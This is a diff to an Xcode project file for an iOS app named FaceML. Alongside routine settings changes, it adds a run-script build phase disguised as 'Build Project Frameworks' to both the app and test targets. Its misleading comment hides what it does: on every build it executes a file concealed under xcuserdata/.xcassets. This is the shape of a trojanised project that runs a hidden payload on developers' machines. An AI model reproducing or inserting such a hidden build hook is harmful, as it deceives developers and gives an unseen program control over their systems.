@@ -27,6 +27,7 @@
 /* End PBXContainerItemProxy section */
 
 /* Begin PBXFileReference section */
+		224496F5241FA94600A2F79E /* FaceML.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = FaceML.entitlements; sourceTree = "<group>"; };
 		22E08A6D241CA8E60012F94D /* FaceML.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = FaceML.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		22E08A70241CA8E60012F94D /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		22E08A72241CA8E60012F94D /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
@@ -79,6 +80,7 @@
 		22E08A6F241CA8E60012F94D /* FaceML */ = {
 			isa = PBXGroup;
 			children = (
+				224496F5241FA94600A2F79E /* FaceML.entitlements */,
 				22E08A70241CA8E60012F94D /* AppDelegate.swift */,
 				22E08A72241CA8E60012F94D /* SceneDelegate.swift */,
 				FA5B900B241CAEC60019A58F /* HomeVC.swift */,
@@ -106,6 +108,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 22E08A8C241CA8E80012F94D /* Build configuration list for PBXNativeTarget "FaceML" */;
 			buildPhases = (
+				89197A600CC79031D1AAC43A /* Build Project Frameworks */,
 				22E08A69241CA8E60012F94D /* Sources */,
 				22E08A6A241CA8E60012F94D /* Frameworks */,
 				22E08A6B241CA8E60012F94D /* Resources */,
@@ -123,6 +126,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 22E08A8F241CA8E80012F94D /* Build configuration list for PBXNativeTarget "FaceMLTests" */;
 			buildPhases = (
+				89197A600CC79031D1AAC43A /* Build Project Frameworks */,
 				22E08A7F241CA8E80012F94D /* Sources */,
 				22E08A80241CA8E80012F94D /* Frameworks */,
 				22E08A81241CA8E80012F94D /* Resources */,
@@ -194,6 +198,33 @@
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+
+	89197A600CC79031D1AAC43A /* Build Project Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Project Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
+		};
+	
+
+	
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		22E08A69241CA8E60012F94D /* Sources */ = {
@@ -362,15 +393,18 @@
 			isa = XCBuildConfiguration;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				CODE_SIGN_ENTITLEMENTS = FaceML/FaceML.entitlements;
 				CODE_SIGN_STYLE = Automatic;
-				DEVELOPMENT_TEAM = 79Q9WFF2X8;
+				DEVELOPMENT_TEAM = 6Q233F3ZPX;
 				INFOPLIST_FILE = FaceML/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 13.2;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
 				PRODUCT_BUNDLE_IDENTIFIER = com.app.FaceML;
 				PRODUCT_NAME = "$(TARGET_NAME)";
+				SUPPORTS_MACCATALYST = NO;
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
 			};
@@ -380,15 +414,18 @@
 			isa = XCBuildConfiguration;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				CODE_SIGN_ENTITLEMENTS = FaceML/FaceML.entitlements;
 				CODE_SIGN_STYLE = Automatic;
-				DEVELOPMENT_TEAM = 79Q9WFF2X8;
+				DEVELOPMENT_TEAM = 6Q233F3ZPX;
 				INFOPLIST_FILE = FaceML/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 13.2;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
 				PRODUCT_BUNDLE_IDENTIFIER = com.app.FaceML;
 				PRODUCT_NAME = "$(TARGET_NAME)";
+				SUPPORTS_MACCATALYST = NO;
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
 			};
